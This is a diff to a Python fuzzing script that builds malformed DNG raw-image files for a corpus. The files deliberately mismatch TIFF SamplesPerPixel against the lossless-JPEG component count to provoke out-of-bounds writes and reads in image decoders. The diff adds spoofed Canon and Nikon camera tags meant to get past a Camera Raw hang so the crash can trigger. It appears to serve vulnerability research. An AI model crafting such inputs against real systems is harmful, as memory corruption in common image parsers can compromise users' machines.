@@ -46,6 +46,8 @@ T_X_RESOLUTION       = 282
 T_Y_RESOLUTION       = 283
 T_PLANAR_CONFIG      = 284
 T_RESOLUTION_UNIT    = 296
+T_MAKE               = 271
+T_MODEL              = 272
 T_CFA_REPEAT_DIM     = 33421
 T_CFA_PATTERN        = 33422
 T_DNG_VERSION        = 50706
@@ -405,7 +407,8 @@ def build_jpegl(width, height, nf, bits=16):
 
 def build_dng(width=64, height=64, spp=3, inner_comps=1,
               bits=16, codec=COMP_JPEG2000,
-              photometric=PHOTO_LINEAR_RAW, outfile=None):
+              photometric=PHOTO_LINEAR_RAW, outfile=None,
+              camera_model=None):
     """
     Assemble a DNG file with deliberate mismatch between:
       TIFF SamplesPerPixel (spp)       -- outer metadata, controls buffer allocation
@@ -415,6 +418,10 @@ def build_dng(width=64, height=64, spp=3, inner_comps=1,
       spp=1 always (Bayer sensor), inner_comps > 1 → OOB WRITE (high priority)
     photometric=PHOTO_LINEAR_RAW (34892):
       spp=3 typically (demosaiced), inner_comps=1 → OOB READ / confusion
+
+    camera_model: if given as (make, model) tuple, adds Make/Model EXIF tags +
+      sets UniqueCameraModel, which may cause Camera Raw to use cached calibration
+      data for a real camera rather than waiting for network/hanging.
     """
     b = TiffBuilder()
 
@@ -439,7 +446,13 @@ def build_dng(width=64, height=64, spp=3, inner_comps=1,
     # DNG identification
     b.add_byte_array(T_DNG_VERSION,      bytes([1, 4, 0, 0]))
     b.add_byte_array(T_DNG_BACKWARD_VER, bytes([1, 1, 0, 0]))
-    b.add_ascii(T_UNIQUE_CAM_MODEL, 'FuzzResearch/ImageIOAudit')
+    if camera_model:
+        make, model = camera_model
+        b.add_ascii(T_MAKE, make)
+        b.add_ascii(T_MODEL, model)
+        b.add_ascii(T_UNIQUE_CAM_MODEL, model)
+    else:
+        b.add_ascii(T_UNIQUE_CAM_MODEL, 'FuzzResearch/ImageIOAudit')
 
     # DNG Camera Raw mandatory tags
     b.add_rational_array(T_DEFAULT_SCALE,       [(1, 1), (1, 1)])
@@ -642,6 +655,44 @@ def generate_corpus(outdir='corpus'):
                       codec=codec, photometric=photometric, outfile=fname)
         except Exception as e:
             print(f'    [!] {name}: {e}')
+
+    # ---- Real camera model DNG (Camera Raw hang bypass hypothesis) ----
+    # Hypothesis: Camera Raw hangs because 'FuzzResearch/ImageIOAudit' is unknown
+    # and Camera Raw waits for network/calibration data. Using a real camera model
+    # (e.g. Canon EOS R5) allows Camera Raw to use bundled calibration and complete
+    # quickly, at which point the JPEGL mismatch can trigger the OOB write/crash.
+    print('\n[*] Real camera model DNG (Camera Raw hang bypass):')
+    CANON_R5 = ('Canon', 'Canon EOS R5')
+    NIKON_Z9  = ('Nikon Corporation', 'NIKON Z 9')
+    real_cam_cases = [
+        # CTRL (matching): should decode quickly if Camera Raw uses bundled calibration
+        ('camraw_canon_cfa_uncomp_ctrl',
+         build_dng(8, 8, spp=1, inner_comps=1, bits=16, codec=COMP_UNCOMPRESSED,
+                   photometric=PHOTO_CFA, camera_model=CANON_R5)),
+        ('camraw_nikon_cfa_uncomp_ctrl',
+         build_dng(8, 8, spp=1, inner_comps=1, bits=16, codec=COMP_UNCOMPRESSED,
+                   photometric=PHOTO_CFA, camera_model=NIKON_Z9)),
+        # JPEGL CTRL (Canon): if Camera Raw accepts, decoder should run cleanly
+        ('camraw_canon_cfa_jpegl_ctrl',
+         build_dng(64, 64, spp=1, inner_comps=1, bits=16, codec=COMP_JPEG_LOSSLESS,
+                   photometric=PHOTO_CFA, camera_model=CANON_R5)),
+        # JPEGL mismatch (Canon): if CTRL doesn't hang, this might crash (OOB write)
+        ('camraw_canon_cfa_jpegl_1spp_3nf',
+         build_dng(64, 64, spp=1, inner_comps=3, bits=16, codec=COMP_JPEG_LOSSLESS,
+                   photometric=PHOTO_CFA, camera_model=CANON_R5)),
+        ('camraw_canon_cfa_jpegl_1spp_4nf',
+         build_dng(64, 64, spp=1, inner_comps=4, bits=16, codec=COMP_JPEG_LOSSLESS,
+                   photometric=PHOTO_CFA, camera_model=CANON_R5)),
+        # LinearRaw mismatch (Canon): OOB read direction
+        ('camraw_canon_lr_jpegl_3spp_1nf',
+         build_dng(64, 64, spp=3, inner_comps=1, bits=16, codec=COMP_JPEG_LOSSLESS,
+                   photometric=PHOTO_LINEAR_RAW, camera_model=CANON_R5)),
+    ]
+    for name, data in real_cam_cases:
+        fname = os.path.join(outdir, f'{name}.dng')
+        with open(fname, 'wb') as f:
+            f.write(data)
+        print(f'    {fname}  ({len(data)} bytes)')
 
     print(f'\n[+] Corpus ready.')
 
